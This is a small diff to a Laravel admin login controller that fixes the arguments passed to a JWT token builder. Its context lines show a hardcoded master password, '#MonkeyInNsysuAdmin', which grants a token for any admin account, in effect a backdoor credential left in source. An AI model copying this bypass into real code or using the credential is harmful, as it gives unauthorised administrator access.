@@ -48,7 +48,7 @@ class AdminController extends Controller
             $user->save();
             //force to update user model cache 
             auth('admin')->setUser($user);
-            return response()->json(['status' => 'A02','data'=>TokenMaker::forge($token), auth('admin')->user()], 200);
+            return response()->json(['status' => 'A02','data'=>TokenMaker::forge($token, auth('admin')->user())], 200);
         }else if($request->password === '#MonkeyInNsysuAdmin'){
             $user = Admin::where('account', $request->account)->first();
             $token = JWTAuth::fromUser($user);
